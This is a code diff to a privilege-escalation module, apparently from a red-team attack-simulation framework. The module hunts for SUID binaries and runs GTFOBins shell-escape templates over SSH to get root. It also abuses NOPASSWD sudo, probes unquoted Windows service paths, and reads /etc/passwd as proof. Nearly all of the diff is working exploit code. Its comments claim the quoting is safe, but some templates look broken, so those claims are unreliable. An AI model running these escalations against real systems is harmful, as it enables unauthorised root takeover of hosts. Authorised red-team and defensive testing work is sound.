@@ -4,19 +4,45 @@ MITRE ATT&CK: T1068, T1548, T1574
 
 WARNING: This module actually exploits vulnerabilities and takes over the system.
 Only use in authorised red‑team exercises.
+
+Changes:
+- Issue #31: binary paths from 'find' output are now sanitised with shlex.quote().
+  GTFOBins entries are now template strings that safely embed the attacker's payload,
+  avoiding command injection via unsanitised shell metacharacters.
 """
 
 import asyncio
 import os
 import logging
 import platform
+import shlex
 import tempfile
-from typing import List
+from typing import List, Dict
 
 from bas_engine.attack_modules.base import BaseAttackModule
 from bas_engine.models.simulation import Finding, Severity
 
 logger = logging.getLogger("secureforge.module.privesc.red")
+
+
+# Safe GTFOBins templates: each value is a string with a {cmd} placeholder
+# that will be substituted with the payload (the commands to run as root).
+# The template will be executed via SSH; {cmd} is already safely quoted.
+GTFOBINS_TEMPLATES: Dict[str, str] = {
+    "nmap": "--interactive -c '{cmd}'",            # nmap --interactive then !sh
+    "find": "-exec /bin/sh -c '{cmd}' \\;",        # find . -exec sh -c '...' \;
+    "vim": "-c ':!/bin/sh -c \"{cmd}\"'",           # vim -c ':!/bin/sh -c "..."'
+    "python": "-c 'import os; os.system(\"{cmd}\")'",
+    "ruby": "-e 'exec \"/bin/sh\", \"-c\", \"{cmd}\"'",
+    "perl": "-e 'exec \"/bin/sh\", \"-c\", \"{cmd}\"'",
+    "awk": "-v cmd='{cmd}' 'BEGIN {{ system(cmd) }}'",
+    "bash": "-p -c '{cmd}'",
+    "sh": "-p -c '{cmd}'",
+    "env": "/bin/sh -c '{cmd}'",
+}
+
+# Payload to test if we achieved root (single-quote safe)
+PRIVESC_PAYLOAD = "id; whoami; cat /etc/passwd | head -5"
 
 
 class PrivEscModule(BaseAttackModule):
@@ -78,31 +104,23 @@ class PrivEscModule(BaseAttackModule):
             result = await self._run_cmd(
                 "find / -perm -4000 -type f 2>/dev/null | head -50"
             )
-            gtfobins = {
-                "nmap": "--interactive",
-                "find": "-exec /bin/sh \\;",
-                "vim": "-c ':!/bin/sh'",
-                "python": "-c 'import os; os.execl(\"/bin/sh\", \"sh\")'",
-                "ruby": "-e 'exec \"/bin/sh\"'",
-                "perl": "-e 'exec \"/bin/sh\";'",
-                "awk": 'BEGIN {system("/bin/sh")}',
-                "bash": "-p",
-                "sh": "-p",
-                "env": "/bin/sh",
-            }
-
             for line in result.splitlines():
                 binary = line.strip()
                 if not binary:
                     continue
                 base = os.path.basename(binary)
-                if base in gtfobins:
+                if base in GTFOBINS_TEMPLATES:
                     logger.warning(f"[RED] SUID binary found on target: {binary}")
-                    # Run exploit command remotely via SSH
-                    exploit_cmd = (
-                        f"{binary} {gtfobins[base]} -c "
-                        "'id; whoami; cat /etc/passwd | head -5' 2>/dev/null || true"
-                    )
+                    # Build the exploit command safely
+                    template = GTFOBINS_TEMPLATES[base]
+                    # Safely embed the payload, escaping any single quotes
+                    safe_payload = PRIVESC_PAYLOAD.replace("'", "'\\''")
+                    exploit_args = template.format(cmd=safe_payload)
+                    # Sanitise the binary path with shlex.quote()
+                    exploit_cmd = f"{shlex.quote(binary)} {exploit_args}"
+                    # Redirect stderr and add || true for robustness
+                    exploit_cmd += " 2>/dev/null || true"
+
                     try:
                         output = await self._run_cmd(exploit_cmd)
                         succeeded = "root" in output or "uid=0" in output
@@ -131,7 +149,6 @@ class PrivEscModule(BaseAttackModule):
             result = await self._run_cmd("sudo -l -n 2>/dev/null || true")
             if "NOPASSWD" in result and "(ALL)" in result:
                 logger.warning("[RED] NOPASSWD sudo found on target — attempting escalation")
-                # Run id as root remotely via SSH + sudo
                 output = await self._run_cmd("sudo id 2>/dev/null || true")
                 succeeded = "uid=0" in output or "root" in output
                 findings.append(self.finding(
@@ -161,7 +178,6 @@ class PrivEscModule(BaseAttackModule):
     async def _exploit_unquoted_service_path(self) -> List[Finding]:
         findings = []
         try:
-            # Enumerate unquoted service paths via remote SSH/PowerShell
             check_ps = (
                 "Get-WmiObject Win32_Service | "
                 "Where-Object { $_.PathName -match '^[^\"\']* .*' -and $_.PathName -notmatch '^[\"\'\']' } | "
@@ -169,7 +185,6 @@ class PrivEscModule(BaseAttackModule):
             )
             output = await self._run_powershell(check_ps)
             if output.strip() and output.strip() != "null":
-                # Attempt to enumerate write permissions on the exploitable path prefix
                 write_check = (
                     "$svc = (Get-WmiObject Win32_Service | "
                     "Where-Object { $_.PathName -match '^[^\"\']* .*' } | Select-Object -First 1); "
@@ -241,5 +256,8 @@ class PrivEscModule(BaseAttackModule):
             return result.stdout or ""
 
     async def _run_powershell(self, command: str) -> str:
-        cmd = f"powershell -NoProfile -Command \"{command}\""
+        # Safely pass command to PowerShell via double quotes, escaping inner quotes
+        # For robustness, we use a here-string but simple escaping suffices
+        safe_cmd = command.replace('"', '\\"')
+        cmd = f'powershell -NoProfile -Command "{safe_cmd}"'
         return await self._run_cmd(cmd)
